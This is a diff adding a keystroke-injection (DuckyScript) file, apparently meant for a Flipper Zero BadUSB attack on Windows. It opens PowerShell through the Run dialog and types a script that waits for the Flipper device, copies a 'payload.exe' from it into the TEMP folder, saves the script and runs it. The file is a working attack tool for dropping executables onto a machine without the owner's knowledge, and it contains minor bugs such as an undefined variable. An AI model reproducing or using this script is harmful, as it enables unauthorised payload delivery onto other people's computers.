@@ -1,0 +1,58 @@
+DELAY 400
+GUI r
+DELAY 300
+STRING powershell
+DELAY 100
+ENTER
+DELAY 500
+
+REM Infiltration over USB
+STRING $tempDirectory = $env:TEMP
+ENTER
+STRING $filePath = Join-Path -Path $tempDirectory -ChildPath "data.txt"
+ENTER
+STRING $stringToSave | Set-Content -Path $filePath
+ENTER
+STRING $scriptContent = @'
+ENTER
+STRING $payloadName = "payload.exe"
+ENTER
+STRING Start-Sleep -Seconds 3
+ENTER
+STRING while (-not (Get-WmiObject Win32_DiskDrive | Where-Object { $_.Model -like "*Flipper*" })) {
+ENTER
+STRING    Start-Sleep -Seconds 5
+ENTER
+STRING }
+ENTER
+STRING $usbDrives = Get-Volume | Where-Object { $_.DriveType -eq 'Removable' }
+ENTER
+STRING $usbDriveLetter = $usbDrives[-1].DriveLetter + ":"
+ENTER
+STRING $destinationPath = "$env:TEMP\$payloadName"
+ENTER
+STRING $sourceFilePath = "$usbDriveLetter\$payloadName"
+ENTER
+STRING if (Test-Path $usbDriveLetter) {
+ENTER
+STRING Copy-Item -Path $sourceFilePath -Destination $destinationPath -Force
+ENTER
+STRING }
+ENTER
+STRING '@
+ENTER
+
+REM Save and execute the script we just wrote.
+STRING $scriptPath = Join-Path -Path $tempDirectory -ChildPath "script.ps1"
+ENTER
+STRING $scriptContent | Out-File -FilePath $scriptPath -Force
+ENTER
+STRING $command = ".\tempDirectory\Script.ps1"
+ENTER
+STRING Invoke-Expression -Command $scriptPath
+ENTER
+
+
+REM Cleanup goes here.
+REM STRING Exit
+REM ENTER
